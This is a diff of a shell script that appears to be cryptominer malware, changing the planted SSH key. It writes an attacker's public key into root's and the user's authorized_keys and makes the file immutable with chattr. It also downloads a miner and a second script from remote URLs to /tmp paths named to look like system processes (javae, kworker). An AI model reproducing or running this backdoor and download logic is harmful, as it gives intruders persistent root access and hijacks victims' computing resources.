@@ -552,7 +552,7 @@ if [ -f "$rtdir" ]; then
     echo "I am root"
     mkdir -p /root/.ssh
     chmod 700 /root/.ssh/
-    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > /root/.ssh/authorized_keys
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCTPIY9nCljiBYxeiWYCJ36ZGWUmT0WBHAL7gc2NszpNP/xPMQjqRzxVr3T0PoimLGugaplZeJLCcL85C1szPSNePOkGpb3K9a4YFmJLcDOMURm+xTdhNLfZ7E7hR23JEhdLWlp+8nuomT7ABSqp86FIghXzTi3Hsc12OscqvCnArUsC84fcR890BtsQ/a4A3mMk6GG0F7j/2CaihqTYMUAT0/Pl5hQl+gZyYFlIfb1tqmmK0OiemC1DdmjPYJKGnA9xIMEmrpD4BKGlrvhBOwyZmJgg+3VKCQHyIxHt61R8ifqAGNsjU3Qg/nWmHCI916pZXQsuwphA3fvupYgCb8FWG0S86ZhQXXcQfjLqbQLPx1Gdn893a5+0Sji3kvj+rQLG/EcbwJ2WJYp86P/OmcnMIF5k/CjhzjvHh38RoH40QOjMVPZ15poy7ygymVYAkL4dmYswAkDRmWcMLe8v0t/sAA5QdZjURE/r6qUyHg35K67en2OlnDRdODSJR0jbKz6xGXY1pcE/KfHJjlgAGvY01r7ivtNXxAtXNTzNle8Xrq/gWQH/zWnnpMfkWOIdRCDbNUhzhBgZSY4Yl5x4YSoMp/4osu3fbcz7GVluBjedmI86eLQ+cxx6gdVkc3DLG1xeujPX+dmAPYsjc89owxsmFhjFUToYm8rDlPFxUW8Vw== uc1" > /root/.ssh/authorized_keys
     chmod 600 /root/.ssh/authorized_keys
     chattr +ia /root/.ssh/authorized_keys
     chattr -ia /etc/javae* /etc/kworker* /root/.ssh/authorized_keys*
@@ -590,7 +590,7 @@ else
         lock_cron
     fi
     chmod 700 ~/.ssh/
-    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > ~/.ssh/authorized_keys
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCTPIY9nCljiBYxeiWYCJ36ZGWUmT0WBHAL7gc2NszpNP/xPMQjqRzxVr3T0PoimLGugaplZeJLCcL85C1szPSNePOkGpb3K9a4YFmJLcDOMURm+xTdhNLfZ7E7hR23JEhdLWlp+8nuomT7ABSqp86FIghXzTi3Hsc12OscqvCnArUsC84fcR890BtsQ/a4A3mMk6GG0F7j/2CaihqTYMUAT0/Pl5hQl+gZyYFlIfb1tqmmK0OiemC1DdmjPYJKGnA9xIMEmrpD4BKGlrvhBOwyZmJgg+3VKCQHyIxHt61R8ifqAGNsjU3Qg/nWmHCI916pZXQsuwphA3fvupYgCb8FWG0S86ZhQXXcQfjLqbQLPx1Gdn893a5+0Sji3kvj+rQLG/EcbwJ2WJYp86P/OmcnMIF5k/CjhzjvHh38RoH40QOjMVPZ15poy7ygymVYAkL4dmYswAkDRmWcMLe8v0t/sAA5QdZjURE/r6qUyHg35K67en2OlnDRdODSJR0jbKz6xGXY1pcE/KfHJjlgAGvY01r7ivtNXxAtXNTzNle8Xrq/gWQH/zWnnpMfkWOIdRCDbNUhzhBgZSY4Yl5x4YSoMp/4osu3fbcz7GVluBjedmI86eLQ+cxx6gdVkc3DLG1xeujPX+dmAPYsjc89owxsmFhjFUToYm8rDlPFxUW8Vw== uc1" > ~/.ssh/authorized_keys
     chmod 600 ~/.ssh/authorized_keys
     download_file_if_needed "$miner_url" "/tmp/javae" "$miner_url_backup"
     download_file_if_needed "$sh_url" "/tmp/kworker" "$sh_url_backup"
